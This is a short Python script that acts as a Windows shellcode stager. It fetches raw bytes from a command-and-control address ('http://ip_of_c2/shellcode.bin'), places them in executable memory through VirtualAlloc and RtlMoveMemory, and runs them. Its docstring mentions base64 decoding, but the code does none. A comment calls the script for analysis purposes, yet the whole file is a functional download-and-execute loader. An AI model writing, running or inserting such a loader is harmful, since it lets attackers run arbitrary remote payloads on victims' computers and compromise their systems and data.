from urllib import request
import ctypes

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40

# Load kernel32 DLL
kernel32 = ctypes.windll.kernel32

def get_code(url):
    """Download and decode base64 encoded shellcode from a given URL."""
    with request.urlopen(url) as response:
        shellcode = response.read()
    return shellcode

def load_shellcode(shellcode):
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
    kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
    
    buf_size = len(shellcode)
    ptr = kernel32.VirtualAlloc(None, buf_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not ptr:
        raise MemoryError("VirtualAlloc failed")
    
    # Write the buffer into allocated memory
    shellcode_buffer = (ctypes.c_char * buf_size).from_buffer_copy(shellcode)
    kernel32.RtlMoveMemory(ptr, shellcode_buffer, buf_size)
    shell_func = ctypes.CFUNCTYPE(None)(ptr)
    shell_func()

if __name__ == '__main__':
    url = "http://ip_of_c2/shellcode.bin"
    shellcode = get_code(url)
    if not shellcode:
        raise ValueError("Shellcode is empty or invalid")
    load_shellcode(shellcode)
    # For analysis purposes
    input("Press Enter to exit...")

